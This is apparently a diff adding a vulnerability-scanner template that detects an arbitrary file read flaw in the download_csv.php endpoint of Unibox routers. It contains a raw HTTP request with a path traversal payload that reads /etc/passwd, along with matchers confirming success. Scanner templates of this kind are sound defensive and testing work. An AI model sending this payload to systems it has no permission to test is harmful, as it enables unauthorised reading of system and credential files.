@@ -1,0 +1,27 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 'root:x:0:0:'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /tools/download_csv.php?download_file=../../../etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+          Accept: */*
+id: unibox-arbitrary-file-read
+info:
+    author: ProjectDiscoveryAI
+    description: |
+        This template checks for an arbitrary file read vulnerability in the `download_csv.php` endpoint of Unibox routers. The endpoint allows downloading files without proper input validation.
+    name: Unibox Arbitrary File Read
+    severity: high
+    tags:
+        - file-read
+        - arbitrary
+        - unibox
